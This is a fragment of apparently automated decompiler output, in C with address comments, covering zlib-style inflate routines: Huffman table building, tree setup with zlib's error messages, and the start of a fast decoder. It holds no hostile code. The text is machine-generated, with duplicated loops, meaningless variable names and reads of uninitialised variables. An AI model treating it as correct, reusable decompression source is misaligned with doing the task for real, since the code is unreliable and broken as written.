                    v137 = v73 - v21;
                    *v42 = 1;
                    v73 = v137;
                    v66 = v136;
                    v92 = v135;
                    v93 = v135;
                    v74 = v137;
                }
            }
            // 0x404f61
            v75 = v74;
            v94 = v93;
            v79 = v86;
            v52 = v94;
            v53 = v130;
            v54 = v98;
            v55 = v102;
            v56 = v89;
            v57 = v75;
            v59 = v86;
            while (v99 != 0) {
                // 0x404dae
                v100 = v99;
                v96 = v98;
                v95 = v130;
                v106 = v75 + v21;
                v90 = v94;
                v67 = v106;
                v69 = v75;
                v80 = v79;
                v91 = v94;
                v101 = v102;
                v88 = v89;
                v71 = v75;
                v83 = v79;
                if (v45 > v106) {
                    v81 = v80;
                    v70 = v69;
                    v107 = v70 + v21;
                    v108 = v20 - v107;
                    v87 = v108 > v21 ? v21 : v108;
                    *v42 = 1;
                    v109 = v45 - v107;
                    v110 = 1 << (v109 & 31);
                    v62 = v110;
                    v61 = v109;
                    if (v110 > v100 && v109 < v87) {
                        // 0x404dfa
                        v113 = v109 + 1;
                        v60 = v113;
                        if (v113 < v87) {
                            // 0x404e00
                            v127 = v46;
                            v63 = v113;
                            v127 += 4;
                            v128 = *(int32_t *)v127;
                            v129 = 2 * (v110 - v100);
                            v60 = v63;
                            while (v129 > v128) {
                                // 0x404dfa
                                v133 = v63 + 1;
                                v68 = v129 - v128;
                                v60 = v133;
                                if (v133 >= v87) {
                                    // break -> 0x404e17
                                    break;
                                }
                                v63 = v133;
                                v127 += 4;
                                v128 = *(int32_t *)v127;
                                v129 = 2 * v68;
                                v60 = v63;
                            }
                        }
                        // 0x404e17
                        v61 = v60;
                        v62 = 1 << (v61 & 31);
                    }
                    // 0x404e17
                    v76 = v61;
                    *v42 = 1;
                    v111 = *a9;
                    v112 = v111 + v62;
                    if (v112 >= 1441) {
                        // 0x404e10
                        *(int32_t *)(v10 - 4) = -3;
                        // 0x404c80
                        return -3;
                    }
                    // 0x404e2f
                    v117 = v90 + 1;
                    v118 = 8 * v111 + a8;
                    v119 = 4 * v117;
                    v120 = v2 - 240 + v119;
                    *(int32_t *)v120 = v118;
                    *a9 = v112;
                    if (v117 == 0) {
                        // 0x404e84
                        *(int32_t *)a6 = v118;
                        v82 = v81;
                    } else {
                        // 0x404e50
                        *(int32_t *)(v119 + v35) = v95;
                        v123 = v95 >> (v70 & 31);
                        v124 = *(int32_t *)(v120 - 4);
                        v125 = (v118 - v124 >> 3) - v123;
                        v126 = v124 + 8 * v123;
                        *(int32_t *)v126 = 0x1000000 * v76 >> 24;
                        *(int32_t *)(v126 + 4) = v125;
                        v82 = v125;
                    }
                    // 0x404e8c
                    v132 = v67 + v21;
                    v90 = v117;
                    v67 = v132;
                    v91 = v117;
                    v101 = v118;
                    v88 = v62;
                    v71 = v107;
                    v83 = v82;
                    while (v45 > v132) {
                        // 0x404dbc
                        v81 = v82;
                        v70 = v107;
                        v107 = v70 + v21;
                        v108 = v20 - v107;
                        v87 = v108 > v21 ? v21 : v108;
                        *v42 = 1;
                        v109 = v45 - v107;
                        v110 = 1 << (v109 & 31);
                        v62 = v110;
                        v61 = v109;
                        if (v110 > v100 && v109 < v87) {
                            // 0x404dfa
                            v113 = v109 + 1;
                            v60 = v113;
                            if (v113 < v87) {
                                // 0x404e00
                                v127 = v46;
                                v63 = v113;
                                v127 += 4;
                                v128 = *(int32_t *)v127;
                                v129 = 2 * (v110 - v100);
                                v60 = v63;
                                while (v129 > v128) {
                                    // 0x404dfa
                                    v133 = v63 + 1;
                                    v68 = v129 - v128;
                                    v60 = v133;
                                    if (v133 >= v87) {
                                        // break -> 0x404e17
                                        break;
                                    }
                                    v63 = v133;
                                    v127 += 4;
                                    v128 = *(int32_t *)v127;
                                    v129 = 2 * v68;
                                    v60 = v63;
                                }
                            }
                            // 0x404e17
                            v61 = v60;
                            v62 = 1 << (v61 & 31);
                        }
                        // 0x404e17
                        v76 = v61;
                        *v42 = 1;
                        v111 = *a9;
                        v112 = v111 + v62;
                        if (v112 >= 1441) {
                            // 0x404e10
                            *(int32_t *)(v10 - 4) = -3;
                            // 0x404c80
                            return -3;
                        }
                        // 0x404e2f
                        v117 = v90 + 1;
                        v118 = 8 * v111 + a8;
                        v119 = 4 * v117;
                        v120 = v2 - 240 + v119;
                        *(int32_t *)v120 = v118;
                        *a9 = v112;
                        if (v117 == 0) {
                            // 0x404e84
                            *(int32_t *)a6 = v118;
                            v82 = v81;
                        } else {
                            // 0x404e50
                            *(int32_t *)(v119 + v35) = v95;
                            v123 = v95 >> (v70 & 31);
                            v124 = *(int32_t *)(v120 - 4);
                            v125 = (v118 - v124 >> 3) - v123;
                            v126 = v124 + 8 * v123;
                            *(int32_t *)v126 = 0x1000000 * v76 >> 24;
                            *(int32_t *)(v126 + 4) = v125;
                            v82 = v125;
                        }
                        // 0x404e8c
                        v132 = v67 + v21;
                        v90 = v117;
                        v67 = v132;
                        v91 = v117;
                        v101 = v118;
                        v88 = v62;
                        v71 = v107;
                        v83 = v82;
                    }
                }
                // 0x404e9a
                v72 = v71;
                v89 = v88;
                v102 = v101;
                v97 = v96;
                v104 = -64;
                v85 = v83;
                if (v96 < 4 * *(int32_t *)(v28 + v35) + a10) {
                    // 0x404eb8
                    v114 = *(int32_t *)v96;
                    if (v114 >= a3) {
                        // 0x404ed3
                        v121 = 4 * (v114 - a3);
                        v103 = (int32_t)(*(char *)(v121 + a5) + 80);
                        v84 = *(int32_t *)(v121 + a4);
                    } else {
                        // 0x404ebf
                        v103 = v114 < 256 ? 0 : 96;
                        v84 = v114;
                    }
                    // 0x404eeb
                    v97 = v96 + 4;
                    v104 = v103;
                    v85 = v84;
                }
                // 0x404eef
                v86 = v85;
                v105 = v104;
                v98 = v97;
                *v42 = 1;
                v115 = v72 & 31;
                v116 = v95 >> v115;
                if (v116 < v89) {
                    // 0x404f05
                    v122 = 1 << (v45 - v72 & 31);
                    v131 = v116;
                    v77 = 8 * v116 + v102;
                    v131 += v122;
                    *(int32_t *)v77 = v105;
                    *(int32_t *)(v77 + 4) = v86;
                    v77 += 8 * v122;
                    while (v131 < v89) {
                        // 0x404f0b
                        v131 += v122;
                        *(int32_t *)v77 = v105;
                        *(int32_t *)(v77 + 4) = v86;
                        v77 += 8 * v122;
                    }
                }
                // 0x404f23
                v99 = v100 - 1;
                *v42 = 1;
                v78 = v95;
                v65 = 1 << (v47 & 31);
                v130 = v78 ^ v65;
                v64 = v65 / 2;
                while ((v78 & v65) != 0) {
                    // 0x404f2e
                    v78 = v130;
                    v65 = v64;
                    v130 = v78 ^ v65;
                    v64 = v65 / 2;
                }
                // 0x404f38
                v134 = 4 * v91 + v35;
                *v42 = 1;
                v73 = v72;
                v66 = v134;
                v92 = v91;
                v93 = v91;
                v74 = v72;
                if ((v130 & -1 - (-1 << v115)) != *(int32_t *)v134) {
                    v135 = v92 - 1;
                    v136 = v66 - 4;
                    v137 = v73 - v21;
                    *v42 = 1;
                    v73 = v137;
                    v66 = v136;
                    v92 = v135;
                    v93 = v135;
                    v74 = v137;
                    while ((v130 & -1 - (-1 << (v137 & 31))) != *(int32_t *)v136) {
                        // 0x404f56
                        v135 = v92 - 1;
                        v136 = v66 - 4;
                        v137 = v73 - v21;
                        *v42 = 1;
                        v73 = v137;
                        v66 = v136;
                        v92 = v135;
                        v93 = v135;
                        v74 = v137;
                    }
                }
                // 0x404f61
                v75 = v74;
                v94 = v93;
                v79 = v86;
                v52 = v94;
                v53 = v130;
                v54 = v98;
                v55 = v102;
                v56 = v89;
                v57 = v75;
                v59 = v86;
            }
        }
        int32_t v138 = v47 + 1; // 0x404f7f
        int32_t v139 = v46 + 4; // 0x404f7f
        int32_t v140 = v45 + 1; // 0x404f7f
        while (v45 < v20) {
            int32_t v141 = v59;
            v43 = v57;
            v44 = v56;
            v45 = v140;
            v46 = v139;
            v47 = v138;
            v48 = v55;
            int32_t v142 = v54;
            v49 = v53;
            v50 = v52;
            v51 = *(int32_t *)v46;
            v52 = v50;
            v53 = v49;
            v54 = v142;
            v55 = v48;
            v56 = v44;
            v57 = v43;
            v59 = v141;
            if (v51 != 0) {
                // 0x404dae
                v100 = v51;
                v96 = v142;
                v95 = v49;
                v106 = v43 + v21;
                v90 = v50;
                v67 = v106;
                v69 = v43;
                v80 = v141;
                v91 = v50;
                v101 = v48;
                v88 = v44;
                v71 = v43;
                v83 = v141;
                if (v45 > v106) {
                    v81 = v80;
                    v70 = v69;
                    v107 = v70 + v21;
                    v108 = v20 - v107;
                    v87 = v108 > v21 ? v21 : v108;
                    *v42 = 1;
                    v109 = v45 - v107;
                    v110 = 1 << (v109 & 31);
                    v62 = v110;
                    v61 = v109;
                    if (v110 > v100 && v109 < v87) {
                        // 0x404dfa
                        v113 = v109 + 1;
                        v60 = v113;
                        if (v113 < v87) {
                            // 0x404e00
                            v127 = v46;
                            v63 = v113;
                            v127 += 4;
                            v128 = *(int32_t *)v127;
                            v129 = 2 * (v110 - v100);
                            v60 = v63;
                            while (v129 > v128) {
                                // 0x404dfa
                                v133 = v63 + 1;
                                v68 = v129 - v128;
                                v60 = v133;
                                if (v133 >= v87) {
                                    // break -> 0x404e17
                                    break;
                                }
                                v63 = v133;
                                v127 += 4;
                                v128 = *(int32_t *)v127;
                                v129 = 2 * v68;
                                v60 = v63;
                            }
                        }
                        // 0x404e17
                        v61 = v60;
                        v62 = 1 << (v61 & 31);
                    }
                    // 0x404e17
                    v76 = v61;
                    *v42 = 1;
                    v111 = *a9;
                    v112 = v111 + v62;
                    if (v112 >= 1441) {
                        // 0x404e10
                        *(int32_t *)(v10 - 4) = -3;
                        // 0x404c80
                        return -3;
                    }
                    // 0x404e2f
                    v117 = v90 + 1;
                    v118 = 8 * v111 + a8;
                    v119 = 4 * v117;
                    v120 = v2 - 240 + v119;
                    *(int32_t *)v120 = v118;
                    *a9 = v112;
                    if (v117 == 0) {
                        // 0x404e84
                        *(int32_t *)a6 = v118;
                        v82 = v81;
                    } else {
                        // 0x404e50
                        *(int32_t *)(v119 + v35) = v95;
                        v123 = v95 >> (v70 & 31);
                        v124 = *(int32_t *)(v120 - 4);
                        v125 = (v118 - v124 >> 3) - v123;
                        v126 = v124 + 8 * v123;
                        *(int32_t *)v126 = 0x1000000 * v76 >> 24;
                        *(int32_t *)(v126 + 4) = v125;
                        v82 = v125;
                    }
                    // 0x404e8c
                    v132 = v67 + v21;
                    v90 = v117;
                    v67 = v132;
                    v91 = v117;
                    v101 = v118;
                    v88 = v62;
                    v71 = v107;
                    v83 = v82;
                    while (v45 > v132) {
                        // 0x404dbc
                        v81 = v82;
                        v70 = v107;
                        v107 = v70 + v21;
                        v108 = v20 - v107;
                        v87 = v108 > v21 ? v21 : v108;
                        *v42 = 1;
                        v109 = v45 - v107;
                        v110 = 1 << (v109 & 31);
                        v62 = v110;
                        v61 = v109;
                        if (v110 > v100 && v109 < v87) {
                            // 0x404dfa
                            v113 = v109 + 1;
                            v60 = v113;
                            if (v113 < v87) {
                                // 0x404e00
                                v127 = v46;
                                v63 = v113;
                                v127 += 4;
                                v128 = *(int32_t *)v127;
                                v129 = 2 * (v110 - v100);
                                v60 = v63;
                                while (v129 > v128) {
                                    // 0x404dfa
                                    v133 = v63 + 1;
                                    v68 = v129 - v128;
                                    v60 = v133;
                                    if (v133 >= v87) {
                                        // break -> 0x404e17
                                        break;
                                    }
                                    v63 = v133;
                                    v127 += 4;
                                    v128 = *(int32_t *)v127;
                                    v129 = 2 * v68;
                                    v60 = v63;
                                }
                            }
                            // 0x404e17
                            v61 = v60;
                            v62 = 1 << (v61 & 31);
                        }
                        // 0x404e17
                        v76 = v61;
                        *v42 = 1;
                        v111 = *a9;
                        v112 = v111 + v62;
                        if (v112 >= 1441) {
                            // 0x404e10
                            *(int32_t *)(v10 - 4) = -3;
                            // 0x404c80
                            return -3;
                        }
                        // 0x404e2f
                        v117 = v90 + 1;
                        v118 = 8 * v111 + a8;
                        v119 = 4 * v117;
                        v120 = v2 - 240 + v119;
                        *(int32_t *)v120 = v118;
                        *a9 = v112;
                        if (v117 == 0) {
                            // 0x404e84
                            *(int32_t *)a6 = v118;
                            v82 = v81;
                        } else {
                            // 0x404e50
                            *(int32_t *)(v119 + v35) = v95;
                            v123 = v95 >> (v70 & 31);
                            v124 = *(int32_t *)(v120 - 4);
                            v125 = (v118 - v124 >> 3) - v123;
                            v126 = v124 + 8 * v123;
                            *(int32_t *)v126 = 0x1000000 * v76 >> 24;
                            *(int32_t *)(v126 + 4) = v125;
                            v82 = v125;
                        }
                        // 0x404e8c
                        v132 = v67 + v21;
                        v90 = v117;
                        v67 = v132;
                        v91 = v117;
                        v101 = v118;
                        v88 = v62;
                        v71 = v107;
                        v83 = v82;
                    }
                }
                // 0x404e9a
                v72 = v71;
                v89 = v88;
                v102 = v101;
                v97 = v96;
                v104 = -64;
                v85 = v83;
                if (v96 < 4 * *(int32_t *)(v28 + v35) + a10) {
                    // 0x404eb8
                    v114 = *(int32_t *)v96;
                    if (v114 >= a3) {
                        // 0x404ed3
                        v121 = 4 * (v114 - a3);
                        v103 = (int32_t)(*(char *)(v121 + a5) + 80);
                        v84 = *(int32_t *)(v121 + a4);
                    } else {
                        // 0x404ebf
                        v103 = v114 < 256 ? 0 : 96;
                        v84 = v114;
                    }
                    // 0x404eeb
                    v97 = v96 + 4;
                    v104 = v103;
                    v85 = v84;
                }
                // 0x404eef
                v86 = v85;
                v105 = v104;
                v98 = v97;
                *v42 = 1;
                v115 = v72 & 31;
                v116 = v95 >> v115;
                if (v116 < v89) {
                    // 0x404f05
                    v122 = 1 << (v45 - v72 & 31);
                    v131 = v116;
                    v77 = 8 * v116 + v102;
                    v131 += v122;
                    *(int32_t *)v77 = v105;
                    *(int32_t *)(v77 + 4) = v86;
                    v77 += 8 * v122;
                    while (v131 < v89) {
                        // 0x404f0b
                        v131 += v122;
                        *(int32_t *)v77 = v105;
                        *(int32_t *)(v77 + 4) = v86;
                        v77 += 8 * v122;
                    }
                }
                // 0x404f23
                v99 = v100 - 1;
                *v42 = 1;
                v78 = v95;
                v65 = 1 << (v47 & 31);
                v130 = v78 ^ v65;
                v64 = v65 / 2;
                while ((v78 & v65) != 0) {
                    // 0x404f2e
                    v78 = v130;
                    v65 = v64;
                    v130 = v78 ^ v65;
                    v64 = v65 / 2;
                }
                // 0x404f38
                v134 = 4 * v91 + v35;
                *v42 = 1;
                v73 = v72;
                v66 = v134;
                v92 = v91;
                v93 = v91;
                v74 = v72;
                if ((v130 & -1 - (-1 << v115)) != *(int32_t *)v134) {
                    v135 = v92 - 1;
                    v136 = v66 - 4;
                    v137 = v73 - v21;
                    *v42 = 1;
                    v73 = v137;
                    v66 = v136;
                    v92 = v135;
                    v93 = v135;
                    v74 = v137;
                    while ((v130 & -1 - (-1 << (v137 & 31))) != *(int32_t *)v136) {
                        // 0x404f56
                        v135 = v92 - 1;
                        v136 = v66 - 4;
                        v137 = v73 - v21;
                        *v42 = 1;
                        v73 = v137;
                        v66 = v136;
                        v92 = v135;
                        v93 = v135;
                        v74 = v137;
                    }
                }
                // 0x404f61
                v75 = v74;
                v94 = v93;
                v79 = v86;
                v52 = v94;
                v53 = v130;
                v54 = v98;
                v55 = v102;
                v56 = v89;
                v57 = v75;
                v59 = v86;
                while (v99 != 0) {
                    // 0x404dae
                    v100 = v99;
                    v96 = v98;
                    v95 = v130;
                    v106 = v75 + v21;
                    v90 = v94;
                    v67 = v106;
                    v69 = v75;
                    v80 = v79;
                    v91 = v94;
                    v101 = v102;
                    v88 = v89;
                    v71 = v75;
                    v83 = v79;
                    if (v45 > v106) {
                        v81 = v80;
                        v70 = v69;
                        v107 = v70 + v21;
                        v108 = v20 - v107;
                        v87 = v108 > v21 ? v21 : v108;
                        *v42 = 1;
                        v109 = v45 - v107;
                        v110 = 1 << (v109 & 31);
                        v62 = v110;
                        v61 = v109;
                        if (v110 > v100 && v109 < v87) {
                            // 0x404dfa
                            v113 = v109 + 1;
                            v60 = v113;
                            if (v113 < v87) {
                                // 0x404e00
                                v127 = v46;
                                v63 = v113;
                                v127 += 4;
                                v128 = *(int32_t *)v127;
                                v129 = 2 * (v110 - v100);
                                v60 = v63;
                                while (v129 > v128) {
                                    // 0x404dfa
                                    v133 = v63 + 1;
                                    v68 = v129 - v128;
                                    v60 = v133;
                                    if (v133 >= v87) {
                                        // break -> 0x404e17
                                        break;
                                    }
                                    v63 = v133;
                                    v127 += 4;
                                    v128 = *(int32_t *)v127;
                                    v129 = 2 * v68;
                                    v60 = v63;
                                }
                            }
                            // 0x404e17
                            v61 = v60;
                            v62 = 1 << (v61 & 31);
                        }
                        // 0x404e17
                        v76 = v61;
                        *v42 = 1;
                        v111 = *a9;
                        v112 = v111 + v62;
                        if (v112 >= 1441) {
                            // 0x404e10
                            *(int32_t *)(v10 - 4) = -3;
                            // 0x404c80
                            return -3;
                        }
                        // 0x404e2f
                        v117 = v90 + 1;
                        v118 = 8 * v111 + a8;
                        v119 = 4 * v117;
                        v120 = v2 - 240 + v119;
                        *(int32_t *)v120 = v118;
                        *a9 = v112;
                        if (v117 == 0) {
                            // 0x404e84
                            *(int32_t *)a6 = v118;
                            v82 = v81;
                        } else {
                            // 0x404e50
                            *(int32_t *)(v119 + v35) = v95;
                            v123 = v95 >> (v70 & 31);
                            v124 = *(int32_t *)(v120 - 4);
                            v125 = (v118 - v124 >> 3) - v123;
                            v126 = v124 + 8 * v123;
                            *(int32_t *)v126 = 0x1000000 * v76 >> 24;
                            *(int32_t *)(v126 + 4) = v125;
                            v82 = v125;
                        }
                        // 0x404e8c
                        v132 = v67 + v21;
                        v90 = v117;
                        v67 = v132;
                        v91 = v117;
                        v101 = v118;
                        v88 = v62;
                        v71 = v107;
                        v83 = v82;
                        while (v45 > v132) {
                            // 0x404dbc
                            v81 = v82;
                            v70 = v107;
                            v107 = v70 + v21;
                            v108 = v20 - v107;
                            v87 = v108 > v21 ? v21 : v108;
                            *v42 = 1;
                            v109 = v45 - v107;
                            v110 = 1 << (v109 & 31);
                            v62 = v110;
                            v61 = v109;
                            if (v110 > v100 && v109 < v87) {
                                // 0x404dfa
                                v113 = v109 + 1;
                                v60 = v113;
                                if (v113 < v87) {
                                    // 0x404e00
                                    v127 = v46;
                                    v63 = v113;
                                    v127 += 4;
                                    v128 = *(int32_t *)v127;
                                    v129 = 2 * (v110 - v100);
                                    v60 = v63;
                                    while (v129 > v128) {
                                        // 0x404dfa
                                        v133 = v63 + 1;
                                        v68 = v129 - v128;
                                        v60 = v133;
                                        if (v133 >= v87) {
                                            // break -> 0x404e17
                                            break;
                                        }
                                        v63 = v133;
                                        v127 += 4;
                                        v128 = *(int32_t *)v127;
                                        v129 = 2 * v68;
                                        v60 = v63;
                                    }
                                }
                                // 0x404e17
                                v61 = v60;
                                v62 = 1 << (v61 & 31);
                            }
                            // 0x404e17
                            v76 = v61;
                            *v42 = 1;
                            v111 = *a9;
                            v112 = v111 + v62;
                            if (v112 >= 1441) {
                                // 0x404e10
                                *(int32_t *)(v10 - 4) = -3;
                                // 0x404c80
                                return -3;
                            }
                            // 0x404e2f
                            v117 = v90 + 1;
                            v118 = 8 * v111 + a8;
                            v119 = 4 * v117;
                            v120 = v2 - 240 + v119;
                            *(int32_t *)v120 = v118;
                            *a9 = v112;
                            if (v117 == 0) {
                                // 0x404e84
                                *(int32_t *)a6 = v118;
                                v82 = v81;
                            } else {
                                // 0x404e50
                                *(int32_t *)(v119 + v35) = v95;
                                v123 = v95 >> (v70 & 31);
                                v124 = *(int32_t *)(v120 - 4);
                                v125 = (v118 - v124 >> 3) - v123;
                                v126 = v124 + 8 * v123;
                                *(int32_t *)v126 = 0x1000000 * v76 >> 24;
                                *(int32_t *)(v126 + 4) = v125;
                                v82 = v125;
                            }
                            // 0x404e8c
                            v132 = v67 + v21;
                            v90 = v117;
                            v67 = v132;
                            v91 = v117;
                            v101 = v118;
                            v88 = v62;
                            v71 = v107;
                            v83 = v82;
                        }
                    }
                    // 0x404e9a
                    v72 = v71;
                    v89 = v88;
                    v102 = v101;
                    v97 = v96;
                    v104 = -64;
                    v85 = v83;
                    if (v96 < 4 * *(int32_t *)(v28 + v35) + a10) {
                        // 0x404eb8
                        v114 = *(int32_t *)v96;
                        if (v114 >= a3) {
                            // 0x404ed3
                            v121 = 4 * (v114 - a3);
                            v103 = (int32_t)(*(char *)(v121 + a5) + 80);
                            v84 = *(int32_t *)(v121 + a4);
                        } else {
                            // 0x404ebf
                            v103 = v114 < 256 ? 0 : 96;
                            v84 = v114;
                        }
                        // 0x404eeb
                        v97 = v96 + 4;
                        v104 = v103;
                        v85 = v84;
                    }
                    // 0x404eef
                    v86 = v85;
                    v105 = v104;
                    v98 = v97;
                    *v42 = 1;
                    v115 = v72 & 31;
                    v116 = v95 >> v115;
                    if (v116 < v89) {
                        // 0x404f05
                        v122 = 1 << (v45 - v72 & 31);
                        v131 = v116;
                        v77 = 8 * v116 + v102;
                        v131 += v122;
                        *(int32_t *)v77 = v105;
                        *(int32_t *)(v77 + 4) = v86;
                        v77 += 8 * v122;
                        while (v131 < v89) {
                            // 0x404f0b
                            v131 += v122;
                            *(int32_t *)v77 = v105;
                            *(int32_t *)(v77 + 4) = v86;
                            v77 += 8 * v122;
                        }
                    }
                    // 0x404f23
                    v99 = v100 - 1;
                    *v42 = 1;
                    v78 = v95;
                    v65 = 1 << (v47 & 31);
                    v130 = v78 ^ v65;
                    v64 = v65 / 2;
                    while ((v78 & v65) != 0) {
                        // 0x404f2e
                        v78 = v130;
                        v65 = v64;
                        v130 = v78 ^ v65;
                        v64 = v65 / 2;
                    }
                    // 0x404f38
                    v134 = 4 * v91 + v35;
                    *v42 = 1;
                    v73 = v72;
                    v66 = v134;
                    v92 = v91;
                    v93 = v91;
                    v74 = v72;
                    if ((v130 & -1 - (-1 << v115)) != *(int32_t *)v134) {
                        v135 = v92 - 1;
                        v136 = v66 - 4;
                        v137 = v73 - v21;
                        *v42 = 1;
                        v73 = v137;
                        v66 = v136;
                        v92 = v135;
                        v93 = v135;
                        v74 = v137;
                        while ((v130 & -1 - (-1 << (v137 & 31))) != *(int32_t *)v136) {
                            // 0x404f56
                            v135 = v92 - 1;
                            v136 = v66 - 4;
                            v137 = v73 - v21;
                            *v42 = 1;
                            v73 = v137;
                            v66 = v136;
                            v92 = v135;
                            v93 = v135;
                            v74 = v137;
                        }
                    }
                    // 0x404f61
                    v75 = v74;
                    v94 = v93;
                    v79 = v86;
                    v52 = v94;
                    v53 = v130;
                    v54 = v98;
                    v55 = v102;
                    v56 = v89;
                    v57 = v75;
                    v59 = v86;
                }
            }
            // 0x404f6f
            v138 = v47 + 1;
            v139 = v46 + 4;
            v140 = v45 + 1;
        }
    }
    int32_t result = 0; // 0x404f88
    if (v20 != 1 && v30 != 0) {
        // 0x404f98
        *(int32_t *)(v10 - 4) = -5;
        result = -5;
    }
    // 0x404c80
    return result;
}

// Address range: 0x404fa0 - 0x40501f
int32_t function_404fa0(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    int32_t v1 = 0; // bp-8, 0x404fa4
    int32_t v2; // 0x404fa0
    if (v2 == 0) {
        // 0x40501c
        return -4;
    }
    int32_t result = function_404c19(a1, 19, 19, 0, 0, a3, a2, a4, &v1, v2); // 0x404fdf
    if (result == -3) {
        // 0x404fee
        *(int32_t *)(a5 + 24) = (int32_t)"oversubscribed dynamic bit lengths tree";
        // 0x40501c
        return result;
    }
    if (result != -5) {
        // 0x404ffc
        if (*(int32_t *)a2 != 0) {
            // 0x40501c
            return result;
        }
    }
    // 0x405004
    *(int32_t *)(a5 + 24) = (int32_t)"incomplete dynamic bit lengths tree";
    // 0x40501c
    return -3;
}

// Address range: 0x40501f - 0x405122
// Used cryptographic patterns:
//  - zinflate_distanceExtraBits (32-bit, little endian)
//  - zinflate_distanceStarts (32-bit, little endian)
//  - zinflate_lengthExtraBits (32-bit, little endian)
//  - zinflate_lengthStarts (32-bit, little endian)
int32_t function_40501f(uint32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9) {
    int32_t v1 = 0; // bp-8, 0x405023
    int32_t v2; // 0x40501f
    if (v2 == 0) {
        // 0x40511f
        return -4;
    }
    int32_t result = function_404c19(a3, a1, 257, (int32_t)&zinflate_lengthStarts_at_40ce6c, (int32_t)&zinflate_lengthExtraBits_at_40cee8, a6, a4, a8, &v1, v2); // 0x405071
    if (result != 0) {
        if (result == -3) {
            // 0x4050f6
            *(int32_t *)(a9 + 24) = (int32_t)"oversubscribed literal/length tree";
            // 0x40511f
            return result;
        }
        // 0x4050ff
        if (result == -4) {
            // 0x40511f
            return -4;
        }
        // 0x405104
        *(int32_t *)(a9 + 24) = (int32_t)"incomplete literal/length tree";
        // 0x40511f
        return -3;
    }
    // 0x40507d
    if (*(int32_t *)a4 == 0) {
        // 0x405104
        *(int32_t *)(a9 + 24) = (int32_t)"incomplete literal/length tree";
        // 0x40511f
        return -3;
    }
    int32_t result2 = function_404c19(4 * a1 + a3, a2, 0, (int32_t)&zinflate_distanceStarts_at_40cf64, (int32_t)&zinflate_distanceExtraBits_at_40cfdc, a7, a5, a8, &v1, v2); // 0x4050ab
    if (result2 == 0) {
        // 0x4050b7
        if (a1 > 257 != (*(int32_t *)a5 == 0)) {
            // 0x40511f
            return 0;
        }
        // 0x4050e8
        *(int32_t *)(a9 + 24) = (int32_t)"empty distance tree with lengths";
        // 0x40511f
        return -3;
    }
    if (result2 == -3) {
        // 0x4050cc
        *(int32_t *)(a9 + 24) = (int32_t)"oversubscribed distance tree";
        // 0x40511f
        return result2;
    }
    if (result2 == -5) {
        // 0x4050da
        *(int32_t *)(a9 + 24) = (int32_t)"incomplete distance tree";
        // 0x40511f
        return -3;
    }
    // 0x4050e3
    if (result2 == -4) {
        // 0x40511f
        return -4;
    }
    // 0x4050e8
    *(int32_t *)(a9 + 24) = (int32_t)"empty distance tree with lengths";
    // 0x40511f
    return -3;
}

// Address range: 0x405122 - 0x40514d
int32_t function_405122(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x405122
    *(int32_t *)a1 = 9;
    *(int32_t *)a2 = 5;
    *(int32_t *)a3 = (int32_t)&g15;
    *(int32_t *)a4 = (int32_t)&g16;
    return 0;
}

// Address range: 0x40514d - 0x40541f
// Used cryptographic patterns:
//  - unlzx_table_three (32-bit, little endian)
int32_t function_40514d(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6) {
    int32_t * v1 = (int32_t *)(a5 + 52); // 0x40515c
    uint32_t v2 = *v1; // 0x40515c
    int32_t * v3 = (int32_t *)(a5 + 28); // 0x40515f
    int32_t * v4 = (int32_t *)a6; // 0x405162
    int32_t * v5 = (int32_t *)(a6 + 4); // 0x40516a
    int32_t * v6 = (int32_t *)(a5 + 32); // 0x405170
    uint32_t v7 = *(int32_t *)(a5 + 48); // 0x405176
    int32_t * v8; // 0x40514d
    int32_t v9; // 0x40514d
    if (v2 >= v7) {
        int32_t * v10 = (int32_t *)(a5 + 44);
        v8 = v10;
        v9 = *v10 - v2;
    } else {
        // 0x40517d
        v8 = (int32_t *)(a5 + 44);
        v9 = v7 + -1 - v2;
    }
    int32_t v11 = *(int32_t *)(4 * a1 + (int32_t)&unlzx_table_three_at_40bca8); // 0x40518d
    int32_t v12 = *(int32_t *)(4 * a2 + (int32_t)&unlzx_table_three_at_40bca8); // 0x40519a
    int32_t * v13 = (int32_t *)(a5 + 40);
    char * v14 = (char *)*v4; // 0x4051a1
    int32_t v15 = *v5; // 0x4051a1
    int32_t v16 = *v6; // 0x4051a1
    int32_t v17 = *v3; // 0x4051a1
    int32_t v18 = v17; // 0x4051a7
    int32_t v19 = v16; // 0x4051a7
    int32_t v20 = v15; // 0x4051a7
    char * v21 = v14; // 0x4051a7
    char * v22 = v14; // 0x4051a7
    int32_t v23 = v15; // 0x4051a7
    int32_t v24 = v16; // 0x4051a7
    int32_t v25 = v17; // 0x4051a7
    int32_t v26; // 0x4051ac
    int32_t v27; // 0x4051b6
    char * v28; // 0x40514d
    int32_t v29; // 0x4051bc
    if (v17 < 20) {
        v26 = v20 - 1;
        v27 = (int32_t)*v21 << (v18 & 31) | v19;
        v28 = (char *)((int32_t)v21 + 1);
        v29 = v18 + 8;
        v18 = v29;
        v19 = v27;
        v20 = v26;
        v21 = v28;
        v22 = v28;
        v23 = v26;
        v24 = v27;
        v25 = v29;
        while (v29 < 20) {
            // 0x4051a9
            v26 = v20 - 1;
            v27 = (int32_t)*v21 << (v18 & 31) | v19;
            v28 = (char *)((int32_t)v21 + 1);
            v29 = v18 + 8;
            v18 = v29;
            v19 = v27;
            v20 = v26;
            v21 = v28;
            v22 = v28;
            v23 = v26;
            v24 = v27;
            v25 = v29;
        }
    }
    char * v30 = (char *)v2;
    int32_t v31 = v23;
    char * v32 = v22;
    int32_t v33 = 8 * (v24 & v11) + a3; // 0x4051ca
    char v34 = *(char *)v33;
    unsigned char v35 = *(char *)(v33 + 1); // 0x4051d5
    int32_t v36 = v24 >> (int32_t)(v35 & 31);
    int32_t v37 = v35;
    int32_t v38 = v37; // 0x4051d9
    int32_t v39 = v36; // 0x4051d9
    char v40 = v34; // 0x4051d9
    int32_t v41 = v25; // 0x4051d9
    int32_t v42 = v33; // 0x4051d9
    int32_t v43 = v33; // 0x4051d9
    int32_t v44 = v25; // 0x4051d9
    int32_t v45 = v36; // 0x4051d9
    int32_t v46 = v37; // 0x4051d9
    int32_t v47; // 0x40514d
    int32_t v48; // 0x40514d
    int32_t v49; // 0x40514d
    int32_t v50; // 0x40514d
    int32_t v51; // 0x40514d
    int32_t v52; // 0x40514d
    int32_t v53; // 0x40514d
